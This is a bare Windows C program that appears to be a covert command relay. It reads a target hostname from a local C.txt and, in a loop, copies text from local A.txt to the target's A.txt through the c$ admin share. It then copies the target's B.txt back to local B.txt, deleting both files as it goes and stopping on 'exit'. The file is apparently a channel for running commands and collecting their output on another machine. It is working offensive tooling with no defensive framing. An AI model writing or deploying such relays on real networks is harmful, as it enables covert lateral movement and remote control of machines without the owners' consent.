#include <windows.h>

static void TrimCrLfA(char* s) {
    if (!s) return;
    int i = 0;
    while (s[i]) i++;
    while (i > 0 && (s[i - 1] == '\r' || s[i - 1] == '\n')) s[--i] = '\0';
}

int main() {
    CHAR basePath[MAX_PATH] = "c:\\Users\\NativT\\Documents\\";

    CHAR pathA[MAX_PATH];
    CHAR pathB[MAX_PATH];
    CHAR pathC[MAX_PATH];

    lstrcpyA(pathA, basePath);
    lstrcpyA(pathB, basePath);
    lstrcpyA(pathC, basePath);

    lstrcatA(pathA, "A.txt");
    lstrcatA(pathB, "B.txt");
    lstrcatA(pathC, "C.txt");

    while (1) {
        Sleep(1000);

        DWORD attrsC = GetFileAttributesA(pathC);
        if (attrsC == INVALID_FILE_ATTRIBUTES || (attrsC & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }

        HANDLE hClocal = CreateFileA(
            pathC,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hClocal == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }

        CHAR buffer[4096];
        DWORD bytesRead = 0, bytesWritten = 0;
        if (!ReadFile(hClocal, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            CloseHandle(hClocal);
            continue;
        }
        buffer[bytesRead] = '\0';
        CloseHandle(hClocal);

        TrimCrLfA(buffer);
        if (lstrcmpiA(buffer, "noav-pc") == 0) {
            continue;
        }

        CHAR fullPathBase[MAX_PATH];
        wsprintfA(fullPathBase, "\\\\%s\\c$\\Users\\NativT\\Documents\\", buffer);

        CHAR fullPathA[MAX_PATH];
        CHAR fullPathB[MAX_PATH];
        CHAR fullPathC[MAX_PATH];
        lstrcpyA(fullPathA, fullPathBase); lstrcatA(fullPathA, "A.txt");
        lstrcpyA(fullPathB, fullPathBase); lstrcatA(fullPathB, "B.txt");
        lstrcpyA(fullPathC, fullPathBase); lstrcatA(fullPathC, "C.txt");

        HANDLE hCrem = CreateFileA(
            fullPathC,
            GENERIC_WRITE,
            FILE_SHARE_READ,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hCrem == INVALID_HANDLE_VALUE) {
            continue;
        }
        WriteFile(hCrem, buffer, lstrlenA(buffer), &bytesWritten, NULL);
        CloseHandle(hCrem);

        while (1) {
            while (GetFileAttributesA(pathA) == INVALID_FILE_ATTRIBUTES) {
                Sleep(1000);
            }

            HANDLE hAloc = CreateFileA(
                pathA,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            if (hAloc == INVALID_HANDLE_VALUE) {
                break;
            }

            bytesRead = 0;
            if (!ReadFile(hAloc, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                CloseHandle(hAloc);
                break;
            }
            buffer[bytesRead] = '\0';
            CloseHandle(hAloc);

            DeleteFileA(pathA);

            HANDLE hArem = CreateFileA(
                fullPathA,
                GENERIC_WRITE,
                FILE_SHARE_READ,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            if (hArem == INVALID_HANDLE_VALUE) {
                break;
            }
            WriteFile(hArem, buffer, lstrlenA(buffer), &bytesWritten, NULL);
            CloseHandle(hArem);

            while (GetFileAttributesA(fullPathB) == INVALID_FILE_ATTRIBUTES) {
                Sleep(1000);
            }

            HANDLE hBrem = CreateFileA(
                fullPathB,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            if (hBrem == INVALID_HANDLE_VALUE) {
                break;
            }

            bytesRead = 0;
            if (!ReadFile(hBrem, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                CloseHandle(hBrem);
                break;
            }
            buffer[bytesRead] = '\0';
            CloseHandle(hBrem);

            int retry = 0;
            while (!DeleteFileA(fullPathB) && retry < 5) {
                retry++;
                Sleep(1000);
            }

            HANDLE hBloc = CreateFileA(
                pathB,
                GENERIC_WRITE,
                FILE_SHARE_READ,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            if (hBloc == INVALID_HANDLE_VALUE) {
                break;
            }
            WriteFile(hBloc, buffer, lstrlenA(buffer), &bytesWritten, NULL);
            CloseHandle(hBloc);

            if (lstrcmpiA(buffer, "exit") == 0) {
                DeleteFileA(fullPathC);
                break;
            }            
        }
    } 
    return 0;
}
